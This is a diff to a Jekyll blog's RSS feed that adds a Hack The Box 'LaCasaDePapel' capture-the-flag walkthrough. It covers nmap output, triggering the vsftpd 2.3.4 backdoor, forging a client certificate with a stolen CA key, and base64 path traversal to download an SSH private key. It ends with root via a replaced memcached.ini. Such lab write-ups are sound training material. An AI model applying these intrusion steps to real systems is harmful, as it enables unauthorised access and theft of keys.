@@ -5,20 +5,220 @@
     <description>&lt;h3&gt;Ramblings of an Infosec enthusiast!&lt;/h3&gt;</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Wed, 17 Jul 2019 16:38:34 -0400</pubDate>
-    <lastBuildDate>Wed, 17 Jul 2019 16:38:34 -0400</lastBuildDate>
+    <pubDate>Sat, 27 Jul 2019 22:02:44 -0400</pubDate>
+    <lastBuildDate>Sat, 27 Jul 2019 22:02:44 -0400</lastBuildDate>
     <generator>Jekyll v3.8.6</generator>
     
       <item>
-        <title>Querrier HTB Walkthrough</title>
-        <description>&lt;p&gt;Hi this is a test&lt;/p&gt;
+        <title>LaCasaDePapel HTB Walkthrough</title>
+        <description>&lt;h4&gt;Hello!&lt;br /&gt;&lt;br /&gt;
+LaCasaDePapel just retired today and this my writeup for it. This is my first writeup so if you have any feedback then please let me know.
+This was an interesting box with some CTF type features. Overall, I had fun hacking this box.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;nmap -sC -sV -oA intial 10.10.10.x -vvv&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;h1&gt;Enumeration:  &lt;/h1&gt;
+&lt;h4&gt;Nmap&lt;/h4&gt;
+&lt;p&gt;First thing that I start with is, Port Scanning.&lt;br /&gt;
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sC -sV -oA nmap/initial 10.10.10.131 -vvv&lt;/code&gt;
+&lt;br /&gt;&lt;/p&gt;
 
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;PORT    STATE SERVICE  REASON  VERSION
+21/tcp  open  ftp      syn-ack vsftpd 2.3.4
+22/tcp  open  ssh      syn-ack OpenSSH 7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNzmarvyIINA+hjsLo2xYn1PUyzuTflhtXQs8S1Z56FzbdzXs6FiwhoRGn63XuGCHqCfEzHmh1cg4HGLfGAMwe+AsdJ8hLd/ISNRECH8yvM+9k78Aio3pe+lYbiWSQWyJrQdeqJXyDJFSd6BR3Cr6/rwSvE7N3eWeQvxS+fsg5HOER6n8SOnXvqpWYUo+XmZxGzmluNfsqoJ6doJCyW3X4sTImTlpmRmee6iseo9neZO18aHsARxlkHCqUhp1SBzIiik3DurtH1tgrn8ntfNiK3q0FZJmh9qzu0P/L50j8bzlJdvAsLuqbYmVZhqFs0JfBVdyVTFMn4O0J+IqRrXAF
+|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNli8Xx10a0s+zrkT1eVfM1kRaAQaK+a/mxYxhPxpK0094QFQBcVrvrXb3+j4M8l2G/C9CtQRWVXpX8ajWhYRik=
+|   256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB2uNaKo2PK5cMci4E7dNWQ6ipiEzG3cWUR56qqMZqYR
+80/tcp  open  http     syn-ack Node.js (Express middleware)
+|_http-favicon: Unknown favicon MD5: 621D76BDE56526A10B529BF2BC0776CA
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: La Casa De Papel
+443/tcp open  ssl/http syn-ack Node.js Express framework
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+|_http-favicon: Unknown favicon MD5: 621D76BDE56526A10B529BF2BC0776CA
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-title: La Casa De Papel
+| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
+| Issuer: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2019-01-27T08:35:30
+| Not valid after:  2029-01-24T08:35:30
+| MD5:   6ea4 933a a347 ce50 8c40 5f9b 1ea8 8e9a
+| SHA-1: 8c47 7f3e 53d8 e76b 4cdf ecca adb6 0551 b1b6 38d4
+| -----BEGIN CERTIFICATE-----
+| MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
+| YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
+| OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
+| cGFwZWwuaHRiMRkwFwYDVQQKDBBMYSBDYXNhIERlIFBhcGVsMIIBIjANBgkqhkiG
+| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEAz3M6VN7OD5sHW+zCbIv/5vJpuaxJF3A5q2rV
+| QJNqU1sFsbnaPxRbFgAtc8hVeMNii2nCFO8PGGs9P9pvoy8e8DR9ksBQYyXqOZZ8
+| /rsdxwfjYVgv+a3UbJNO4e9Sd3b8GL+4XIzzSi3EZbl7dlsOhl4+KB4cM4hNhE5B
+| 4K8UKe4wfKS/ekgyCRTRENVqqd3izZzz232yyzFvDGEOFJVzmhlHVypqsfS9rKUV
+| ESPHczaEQld3kupVrt/mBqwuKe99sluQzORqO1xMqbNgb55ZD66vQBSkN2PwBeiR
+| PBRNXfnWla3Gkabukpu9xR9o+l7ut13PXdQ/fPflLDwnu5wMZwIDAQABMA0GCSqG
+| SIb3DQEBCwUAA4IBAQCuo8yzORz4pby9tF1CK/4cZKDYcGT/wpa1v6lmD5CPuS+C
+| hXXBjK0gPRAPhpF95DO7ilyJbfIc2xIRh1cgX6L0ui/SyxaKHgmEE8ewQea/eKu6
+| vmgh3JkChYqvVwk7HRWaSaFzOiWMKUU8mB/7L95+mNU7DVVUYB9vaPSqxqfX6ywx
+| BoJEm7yf7QlJTH3FSzfew1pgMyPxx0cAb5ctjQTLbUj1rcE9PgcSki/j9WyJltkI
+| EqSngyuJEu3qYGoM0O5gtX13jszgJP+dA3vZ1wqFjKlWs2l89pb/hwRR2raqDwli
+| MgnURkjwvR1kalXCvx9cST6nCkxF2TxlmRpyNXy4
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|   http/1.1
+|_  http/1.0
+Service Info: OS: Unix&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Page on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.10.131&lt;/code&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/80.png&quot; width=&quot;90%&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+Page on &lt;code class=&quot;highlighter-rouge&quot;&gt;https://10.10.10.131&lt;/code&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/website.png&quot; width=&quot;90%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1&gt;Exploitation:&lt;/h1&gt;
+&lt;p&gt;I started to search exploits for the services found on nmap. 
+By searching exploit of vsftpd 2.3.4 on google, we land to this page 
+&lt;code class=&quot;highlighter-rouge&quot;&gt;https://sweshsec.wordpress.com/2015/07/31/vsftpd-vulnerability-exploitation-with-manual-approach/&lt;/code&gt;
+&lt;br /&gt;
+The exploit: 
+If we try to log into the FTP server with a username ending with &lt;code class=&quot;highlighter-rouge&quot;&gt;:)&lt;/code&gt; and any password, then a backdoor opens at port &lt;code class=&quot;highlighter-rouge&quot;&gt;6200&lt;/code&gt;.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;ftp 10.10.10.131
+Connected to 10.10.10.131.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.131:an4m1k): user:)
+331 Please specify the password.
+Password:&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;The shell freezes after this.&lt;/p&gt;
+
+&lt;p&gt;Let’s try to connect to port &lt;code class=&quot;highlighter-rouge&quot;&gt;6200&lt;/code&gt; as per the exploit.
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;nc -nv 10.10.10.131 6200&lt;/code&gt; 
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/6200.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+It looks like a php shell, so I assumed that it will interpret php commands. If we try any system commands then the system doesn’t recognize those commands.
+After trying some commands, I found something interesting.
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/6200 help.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+After trying multiple commands with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt;, I found some commands that worked.
+&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;scandir:&lt;/code&gt; Returns an array of files and directories from directory.
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/scandir.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+We can see the files and we can read the files by using &lt;code class=&quot;highlighter-rouge&quot;&gt;file_get_contents&lt;/code&gt;.
+&lt;br /&gt;
+&lt;br /&gt;
+If we looked at the page on &lt;code class=&quot;highlighter-rouge&quot;&gt;https://10.10.10.131&lt;/code&gt;, you can see that we get certificate error.
+&lt;br /&gt;
+I found &lt;code class=&quot;highlighter-rouge&quot;&gt;ca.key&lt;/code&gt; in the directory &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/nairobi&lt;/code&gt; &lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/cakey.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+If you wondering whether I can read files then I can read &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;. But that is not the case. I don’t have permission to read &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;.
+&lt;br /&gt;&lt;br /&gt;
+We can see that we need a certificate to access the site on &lt;code class=&quot;highlighter-rouge&quot;&gt;https://19.10.10.131/&lt;/code&gt; and we have a &lt;code class=&quot;highlighter-rouge&quot;&gt;ca.key&lt;/code&gt; from the shell on &lt;code class=&quot;highlighter-rouge&quot;&gt;port 6200&lt;/code&gt;&lt;br /&gt;
+The next step is to create a client certificate using &lt;code class=&quot;highlighter-rouge&quot;&gt;ca.key&lt;/code&gt; and the existing certificate that we export from &lt;code class=&quot;highlighter-rouge&quot;&gt;https://10.10.10.131/&lt;/code&gt;
+&lt;br /&gt;&lt;br /&gt;
+The resources that I used for this section :&lt;br /&gt;&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs&quot;&gt;https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326&quot;&gt;https://medium.com/@sevcsik/authentication-using-https-client-certificates-3c9d270e8326&lt;/a&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;To create client certificate, we have to generate a Private Key and Certificate Signing Requests(CSR)&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl req  -newkey rsa:2048 -nodes -keyout mykey.key -out mykey.csr&lt;/code&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step is to create a client certificate by using &lt;code class=&quot;highlighter-rouge&quot;&gt;ca.key&lt;/code&gt;&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl x509 -req -in mykey.csr -CA lacasadepapel_htb.crt -CAkey ca.key -out myclient.pem -set_serial 01 -days 365&lt;/code&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;To import this certificate to Firefox, we have to convert it into PKCS12 format.&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;openssl  pkcs12 -export -inkey domain.key -in client.pem -out client.p12&lt;/code&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+I imported &lt;code class=&quot;highlighter-rouge&quot;&gt;client.pk12&lt;/code&gt; in Firefox and reloaded the web page.
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/privatearea.png&quot; width=&quot;90%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see a nice private area. After clicking around, I found something interesting. The url &lt;code class=&quot;highlighter-rouge&quot;&gt;https://10.10.10.131/?path=SEASON-1&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;path&lt;/code&gt; to search for files.
+If we enter a valid path following the &lt;code class=&quot;highlighter-rouge&quot;&gt;path=&lt;/code&gt;, we can read the contents of the directories.
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/ssh1.png&quot; width=&quot;90%&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Now we can’t just download the file or read the contents of the file.&lt;br /&gt;
+I used Burpsuite to see what requests are sent while downloading a file. You can do that by starting Burp and clicking on any file in Season-1 folder.&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/burp.png&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;The request sent is &lt;code class=&quot;highlighter-rouge&quot;&gt;GET /file/U0VBU09OLTEvMDEuYXZp&lt;/code&gt;, where the file name is encoded in base-64. You can verify it by &lt;code class=&quot;highlighter-rouge&quot;&gt;echo 'U0VBU09OLTEvMDEuYXZp' | base64 -d&lt;/code&gt;&lt;br /&gt;&lt;br /&gt;
+Now I want something to that will help me log into the machine. There is &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; folder, I can try to download the private key &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; and see if I hit any luck.
+&lt;br /&gt;&lt;br /&gt;
+To download that we have to convert the path into base64 - &lt;code class=&quot;highlighter-rouge&quot;&gt;echo -n ../.ssh/id_rsa | base64&lt;/code&gt;. We get &lt;code class=&quot;highlighter-rouge&quot;&gt;Li4vLnNzaC9pZF9yc2E=&lt;/code&gt;&lt;br /&gt;
+&lt;br /&gt;
+It worked!&amp;lt;br/:w&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasa/idrsa.png&quot; width=&quot;90%&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Now we can just have to login using the private key. For user, I had to do trial and error to find out that that the key was for the user &lt;code class=&quot;highlighter-rouge&quot;&gt;professor&lt;/code&gt; &lt;br /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasa/ssh.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once I am logged in, I can’t read &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;:(&lt;/code&gt;&lt;br /&gt;&lt;br /&gt;
+But I see some interesting files in the &lt;code class=&quot;highlighter-rouge&quot;&gt;professor's&lt;/code&gt; home directory.&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasa/priv.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;By looking at the processes by using &lt;code class=&quot;highlighter-rouge&quot;&gt;ps&lt;/code&gt; command, we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/node&lt;/code&gt; is executing whatever is in &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.js&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt; is file that calls that process.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/lacasa/priv1.png&quot; /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we can edit or change this &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt; file, then we can run anything as root. After some trial and error, I found out that, I cannot edit &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt; but I can move it and place my own &lt;code class=&quot;highlighter-rouge&quot;&gt;memcached.ini&lt;/code&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/priv2.png&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+We have root!&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/root.png&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+I can read both &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; flags.&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/lacasa/flags.png&quot; /&gt;&lt;/p&gt;
 </description>
-        <pubDate>Mon, 24 Jun 2019 12:31:43 -0400</pubDate>
-        <link>http://localhost:4000/htb/walkthrough/2019/06/24/Querrier-HTB-Walkthrough.html</link>
-        <guid isPermaLink="true">http://localhost:4000/htb/walkthrough/2019/06/24/Querrier-HTB-Walkthrough.html</guid>
+        <pubDate>Thu, 27 Jun 2019 00:00:00 -0400</pubDate>
+        <link>http://localhost:4000/htb/walkthrough/2019/06/27/LaCasaDePepel-HTB-Walkthrough.html</link>
+        <guid isPermaLink="true">http://localhost:4000/htb/walkthrough/2019/06/27/LaCasaDePepel-HTB-Walkthrough.html</guid>
         
         
         <category>HTB</category>
